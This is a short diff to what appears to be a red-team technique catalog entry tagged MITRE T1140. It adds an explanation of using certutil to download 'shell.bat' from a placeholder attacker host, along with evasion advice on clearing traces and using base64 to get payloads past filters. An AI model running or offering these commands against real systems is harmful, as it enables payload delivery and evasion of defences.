@@ -86,5 +86,6 @@
       "MITRE T1140"
     ],
     "evasion": "Touch only what you need; remove any scheduled task/mounted disk/dropped file you create."
-  }
+  },
+  "explain": "Uses the certutil LOLBAS to download a payload over HTTP:\n  certutil.exe -urlcache   use the URL cache download function\n  -split                   split/handle the cached file\n  -f                       force overwrite of any cached copy\n  http://<lhost>:8080/shell.bat shell.bat   the source URL and local output name\nA living-off-the-land way to fetch tools past filters; certutil can also base64 encode/decode to smuggle payloads."
 }
